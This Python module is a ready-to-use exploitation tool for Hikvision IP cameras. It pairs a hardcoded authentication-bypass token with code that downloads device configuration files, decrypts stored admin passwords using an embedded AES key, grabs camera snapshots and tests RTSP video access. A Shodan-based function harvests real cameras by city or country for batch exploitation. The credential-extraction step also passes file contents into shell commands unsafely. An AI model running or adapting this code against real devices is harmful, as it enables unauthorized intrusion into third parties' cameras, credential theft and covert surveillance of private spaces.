#!/usr/bin/env python3
"""
HIKScript Wrapper
Provides Python API for interacting with HIKScript functionality
"""

import sys
import os
import requests
import json
import subprocess
from pathlib import Path
from typing import Dict, List, Optional

# HIKScript constants (from HIKScript.py)
HIKVISION_MAGIC_AUTH = "?auth=YWRtaW46MTEK"
SNAPSHOT_SUFFIX = "/onvif-http/snapshot"
CONFIG_SUFFIX = "/System/configurationFile"
USERS_SUFFIX = "/Security/users"
RTSP_PORT = 554
HTTP_TIMEOUT = 5


class HIKScriptWrapper:
    """Wrapper class for HIKScript functionality"""

    def __init__(self, timeout=HTTP_TIMEOUT):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.timeout = timeout

    def check_vulnerability(self, ip: str, port: int = 80) -> Dict:
        """
        Check if a camera is vulnerable to the authentication bypass

        Args:
            ip: IP address of the camera
            port: Port number (default 80)

        Returns:
            Dict with vulnerability status and details
        """
        target = f"http://{ip}:{port}"
        result = {
            'target': f"{ip}:{port}",
            'vulnerable': False,
            'accessible': False,
            'credentials': None,
            'error': None
        }

        try:
            # Test basic access
            response = self.session.get(target, timeout=self.timeout)
            result['accessible'] = True

            # Test authentication bypass
            vuln_url = f"{target}{USERS_SUFFIX}{HIKVISION_MAGIC_AUTH}"
            vuln_response = self.session.get(vuln_url, timeout=self.timeout)

            if vuln_response.status_code == 200:
                result['vulnerable'] = True

                # Try to extract credentials
                try:
                    config_url = f"{target}{CONFIG_SUFFIX}{HIKVISION_MAGIC_AUTH}"
                    config_response = self.session.get(config_url, timeout=self.timeout)

                    if config_response.status_code == 200:
                        # Save config for credential extraction
                        config_file = f"/tmp/hikconfig_{ip.replace('.', '_')}.xml"
                        with open(config_file, 'wb') as f:
                            f.write(config_response.content)

                        # Extract credentials using openssl
                        credentials = self.extract_credentials(config_file)
                        result['credentials'] = credentials

                        # Clean up
                        os.remove(config_file)
                except Exception as e:
                    result['error'] = f"Credential extraction failed: {str(e)}"

        except requests.Timeout:
            result['error'] = 'Connection timeout'
        except requests.RequestException as e:
            result['error'] = f'Request failed: {str(e)}'
        except Exception as e:
            result['error'] = f'Unexpected error: {str(e)}'

        return result

    def extract_credentials(self, config_file: str) -> List[Dict]:
        """
        Extract credentials from configuration file

        Args:
            config_file: Path to configuration XML file

        Returns:
            List of credential dictionaries
        """
        credentials = []

        try:
            # Use grep to find encrypted passwords
            cmd = f"grep -oP '(?<=<password>)[^<]+' {config_file}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0 and result.stdout:
                encrypted_passwords = result.stdout.strip().split('\n')

                # Decrypt each password using openssl
                for enc_pass in encrypted_passwords:
                    try:
                        decrypt_cmd = f"echo '{enc_pass}' | openssl enc -aes-128-ecb -d -K 279977f62f6cfd2d91cd75b889ce0c9a -a 2>/dev/null"
                        decrypt_result = subprocess.run(decrypt_cmd, shell=True, capture_output=True, text=True)

                        if decrypt_result.returncode == 0 and decrypt_result.stdout:
                            decrypted = decrypt_result.stdout.strip()
                            if decrypted:
                                credentials.append({
                                    'username': 'admin',  # Default user
                                    'password': decrypted
                                })
                    except Exception:
                        continue

        except Exception as e:
            print(f"Error extracting credentials: {e}")

        return credentials

    def test_rtsp_stream(self, ip: str, username: str, password: str, channel: int = 101) -> bool:
        """
        Test RTSP stream availability

        Args:
            ip: Camera IP address
            username: Username
            password: Password
            channel: RTSP channel number

        Returns:
            True if stream is accessible
        """
        rtsp_url = f"rtsp://{username}:{password}@{ip}:{RTSP_PORT}/Streaming/Channels/{channel}"

        try:
            # Use ffprobe to test stream
            cmd = [
                'ffprobe',
                '-v', 'error',
                '-show_entries', 'stream=codec_type',
                '-of', 'default=noprint_wrappers=1',
                rtsp_url
            ]

            result = subprocess.run(cmd, capture_output=True, timeout=10)
            return result.returncode == 0

        except Exception:
            return False

    def capture_snapshot(self, ip: str, port: int = 80, output_path: str = None) -> Optional[str]:
        """
        Capture snapshot from vulnerable camera

        Args:
            ip: Camera IP address
            port: Port number
            output_path: Path to save snapshot

        Returns:
            Path to saved snapshot or None
        """
        if not output_path:
            output_path = f"/tmp/snapshot_{ip.replace('.', '_')}.jpg"

        try:
            target = f"http://{ip}:{port}"
            snapshot_url = f"{target}{SNAPSHOT_SUFFIX}{HIKVISION_MAGIC_AUTH}"

            response = self.session.get(snapshot_url, timeout=self.timeout)

            if response.status_code == 200 and response.content:
                with open(output_path, 'wb') as f:
                    f.write(response.content)
                return output_path

        except Exception as e:
            print(f"Snapshot capture failed: {e}")

        return None


# Convenience functions
def check_single_camera(ip: str, port: int = 80) -> Dict:
    """Check a single camera for vulnerabilities"""
    wrapper = HIKScriptWrapper()
    return wrapper.check_vulnerability(ip, port)


def run_shodan_scan(api_key: str, city: str = '', country: str = '', limit: int = 100) -> Dict:
    """
    Run Shodan scan for Hikvision cameras

    Args:
        api_key: Shodan API key
        city: City filter
        country: Country code filter
        limit: Maximum results

    Returns:
        Dict with scan results
    """
    try:
        import shodan

        api = shodan.Shodan(api_key)

        # Build query
        query = "App-webs+200+OK"
        if city:
            query += f" city:{city}"
        if country:
            query += f" country:{country}"

        # Search
        results = api.search(query, limit=limit)

        # Extract IPs and ports
        targets = []
        for result in results['matches']:
            ip = result['ip_str']
            port = result.get('port', 80)
            targets.append(f"{ip}:{port}")

        # Save to file
        output_dir = Path('targets')
        output_dir.mkdir(exist_ok=True)

        timestamp = __import__('datetime').datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = output_dir / f"hikvision_{timestamp}.txt"

        with open(output_file, 'w') as f:
            f.write('\n'.join(targets))

        return {
            'targets': targets,
            'count': len(targets),
            'file_path': str(output_file),
            'location': f"{city}, {country}" if city or country else "Global"
        }

    except Exception as e:
        return {
            'error': str(e),
            'targets': [],
            'count': 0
        }


def batch_check_cameras(targets: List[str], timeout: int = 5) -> List[Dict]:
    """
    Check multiple cameras for vulnerabilities

    Args:
        targets: List of IP:PORT strings
        timeout: Request timeout

    Returns:
        List of vulnerability check results
    """
    wrapper = HIKScriptWrapper(timeout=timeout)
    results = []

    for target in targets:
        if ':' in target:
            ip, port = target.split(':')
            port = int(port)
        else:
            ip = target
            port = 80

        result = wrapper.check_vulnerability(ip, port)
        results.append(result)

    return results
